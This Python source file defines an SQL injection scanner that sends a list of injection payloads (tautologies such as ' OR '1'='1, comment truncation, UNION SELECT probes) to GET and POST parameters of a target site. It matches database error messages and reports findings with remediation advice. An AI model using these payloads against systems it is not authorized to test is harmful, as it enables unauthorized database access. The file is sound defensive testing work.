"""SQL Injection vulnerability scanner."""
import re
from typing import List
from urllib.parse import urlencode, parse_qs, urlparse, parse_qsl
import logging

from src.scanners.base import BaseScanner
from src.models import (
    Finding, Severity, VulnerabilityCategory, Remediation,
    ProofOfConcept, HTTPRequest, HTTPResponse
)

logger = logging.getLogger(__name__)


class SQLiScanner(BaseScanner):
    """Scanner for SQL injection vulnerabilities."""

    # SQL injection payloads
    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or ('1'='1",
        "') or ('1'='1' --",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
    ]

    # Error patterns indicating SQL injection
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.* SQL[-_ ]*Server",
        r"OLE DB.* SQL Server",
        r"SQLServer JDBC Driver",
        r"Microsoft SQL Native Client",
        r"sqlite3.OperationalError:",
        r"SQLite/JDBCDriver",
        r"System.Data.SQLite.SQLiteException",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",
    ]

    @property
    def name(self) -> str:
        return "SQLiScanner"

    @property
    def description(self) -> str:
        return "Detects SQL injection vulnerabilities in web applications"

    def scan(self) -> List[Finding]:
        """Execute SQL injection scan."""
        logger.info(f"Starting SQL injection scan on {self.target.base_url}")

        # Test GET parameters
        self._test_get_parameters()

        # Test POST parameters
        self._test_post_parameters()

        logger.info(f"SQL injection scan complete. Found {len(self.findings)} issues.")
        return self.findings

    def _test_get_parameters(self):
        """Test GET parameters for SQL injection."""
        test_urls = [
            f"{self.target.base_url}/search",
            f"{self.target.base_url}/product",
            f"{self.target.base_url}/user",
            f"{self.target.base_url}/login",
        ]

        for url in test_urls:
            params = {"id": "1", "q": "test", "search": "test"}

            for param_name, param_value in params.items():
                for payload in self.PAYLOADS:
                    test_params = params.copy()
                    test_params[param_name] = payload

                    test_url = f"{url}?{urlencode(test_params)}"

                    try:
                        response = self.make_request("GET", test_url)

                        if self._is_vulnerable(response.text):
                            self._create_sqli_finding(
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                method="GET",
                                response=response
                            )
                            break  # Found vulnerability, move to next parameter

                    except Exception as e:
                        logger.debug(f"Error testing {test_url}: {e}")

    def _test_post_parameters(self):
        """Test POST parameters for SQL injection."""
        test_urls = [
            f"{self.target.base_url}/login",
            f"{self.target.base_url}/search",
            f"{self.target.base_url}/comment",
        ]

        for url in test_urls:
            data = {"username": "admin", "password": "password", "email": "test@test.com"}

            for param_name, param_value in data.items():
                for payload in self.PAYLOADS:
                    test_data = data.copy()
                    test_data[param_name] = payload

                    try:
                        response = self.make_request("POST", url, data=test_data)

                        if self._is_vulnerable(response.text):
                            self._create_sqli_finding(
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                method="POST",
                                response=response,
                                post_data=test_data
                            )
                            break

                    except Exception as e:
                        logger.debug(f"Error testing {url}: {e}")

    def _is_vulnerable(self, response_text: str) -> bool:
        """Check if response indicates SQL injection vulnerability."""
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                logger.debug(f"Found SQL error pattern: {pattern}")
                return True
        return False

    def _create_sqli_finding(
        self,
        url: str,
        parameter: str,
        payload: str,
        method: str,
        response,
        post_data: dict = None
    ):
        """Create a SQL injection finding."""
        finding = Finding(
            title=f"SQL Injection in {parameter} parameter",
            description=(
                f"The application is vulnerable to SQL injection through the "
                f"'{parameter}' parameter. An attacker can inject malicious SQL "
                f"code to manipulate database queries, potentially leading to "
                f"unauthorized data access, data modification, or even complete "
                f"system compromise."
            ),
            severity=Severity.CRITICAL,
            category=VulnerabilityCategory.SQL_INJECTION,
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            affected_url=url,
            affected_parameter=parameter,
            proof_of_concept=ProofOfConcept(
                description="Injected SQL payload triggers database error",
                steps=[
                    f"Send {method} request to {url}",
                    f"Set {parameter} parameter to: {payload}",
                    "Observe SQL error in response"
                ],
                request=HTTPRequest(
                    method=method,
                    url=url,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=urlencode(post_data) if post_data else None
                ),
                response=HTTPResponse(
                    status_code=response.status_code,
                    headers=dict(response.headers),
                    body=response.text[:500],  # First 500 chars
                    response_time_ms=response.elapsed.total_seconds() * 1000
                ),
                payload=payload,
                impact_demonstration="SQL error messages exposed in response"
            ),
            remediation=Remediation(
                summary="Use parameterized queries (prepared statements) instead of string concatenation",
                detailed_steps=[
                    "Replace all dynamic SQL queries with parameterized queries",
                    "Use ORM frameworks that handle parameterization automatically",
                    "Implement input validation and sanitization as defense-in-depth",
                    "Use stored procedures with parameterized inputs",
                    "Apply principle of least privilege to database accounts",
                    "Enable database query logging and monitoring"
                ],
                code_examples={
                    "python": """
# Vulnerable code:
query = f"SELECT * FROM users WHERE username = '{username}'"

# Fixed code:
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
                    """,
                    "php": """
// Vulnerable code:
$query = "SELECT * FROM users WHERE username = '$username'";

// Fixed code:
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
                    """
                },
                references=[
                    "https://owasp.org/www-community/attacks/SQL_Injection",
                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                    "https://cwe.mitre.org/data/definitions/89.html"
                ]
            ),
            cwe_ids=[89],  # CWE-89: SQL Injection
            verified=True
        )

        self.add_finding(finding)
